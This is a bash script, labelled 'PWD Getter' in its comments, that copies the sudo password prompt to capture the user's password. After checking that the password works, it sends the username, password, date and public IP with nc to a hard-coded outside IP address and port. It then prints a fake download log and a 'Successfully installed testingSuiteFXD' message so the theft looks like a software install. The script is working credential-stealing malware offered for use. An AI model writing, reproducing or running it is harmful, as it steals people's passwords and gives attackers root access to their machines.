#!/bin/bash

# PWD Getter
sudo -k

read -sp "[sudo] password for $USER: " pwd < /dev/tty
echo ""
echo "$pwd" | sudo -S -v &>/dev/null

if ! sudo -n true 2>/dev/null; then
    # Attempt to authenticate using the provided password
    while ! sudo -n true 2>/dev/null; do
        echo "Sorry, try again."
        read -sp "[sudo] password for $USER: " pwd < /dev/tty
        echo "$pwd" | sudo -S -v &>/dev/null
        echo 
    done
fi

# Sends PWD off
echo "User: $USER // Pwd: $pwd // Date: $(date +"%Y/%m/%d - %I:%M %p") // IP: $(curl -s ifconfig.me)" | nc -u -q 0 144.24.21.253 65432

unset pwd
# preps long msg

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
[DEBUG] Syncing file descriptor.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
EOF

# reads long msg slow

while IFS= read -r line; do
  echo "$line"
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"


# sends short msg
echo Successfully installed testingSuiteFXD

#sleep 2
#clear
